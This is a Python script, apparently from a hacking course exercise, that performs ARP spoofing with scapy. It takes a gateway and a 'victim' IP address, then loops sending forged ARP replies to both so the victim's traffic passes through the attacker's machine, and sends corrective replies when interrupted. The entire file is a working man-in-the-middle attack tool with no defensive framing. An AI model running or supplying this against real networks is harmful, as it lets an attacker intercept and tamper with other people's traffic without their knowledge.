import scapy.all as scapy
import time
import optparse

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-g", "--gateway", dest="gateway", help="IP address of gateway")
    parser.add_option("-v", "--victim", dest="victim", help="IP address of victim machine")
    (values, arguments) = parser.parse_args()

    if not values.gateway:
        parser.error("[-] Please specify the IP address of the gateway, use --help for more information")
    elif not values.victim:
        parser.error("[-] Please specify the IP address of the victim machine, use --help for more information")
    else:
        return values

def get_target_mac(ip_address):
    request_ip = scapy.ARP(pdst=ip_address)
    broadcast_mac = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_packet = broadcast_mac/request_ip
    print(arp_request_packet.show())
    answered_list = scapy.srp(arp_request_packet, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def restore_network(src_ip, dst_ip):
    src_mac = get_target_mac(src_ip)
    dst_mac = get_target_mac(dst_ip)

    response_packet = scapy.ARP(op=2,pdst=dst_ip,hwdst=dst_mac,psrc=src_ip, hwsrc=src_mac)
    scapy.send(response_packet, count=5, verbose=False)

def spoof_victim(target_ip, victim_ip):
    target_mac = get_target_mac(target_ip)
    response_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=victim_ip)
    scapy.send(response_packet, verbose=False)
    

def main():
    values = get_arguments()

    packets_sent=0
    try:
        while True:
            spoof_victim(values.victim, values.gateway)
            spoof_victim(values.gateway, values.victim)
            packets_sent+=2
            print("\r[+] Number of packets sent: " + str(packets_sent), end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[-] Ctrl+C detected ... Restoring network")
        restore_network(values.victim, values.gateway)
        restore_network(values.gateway, values.victim)
    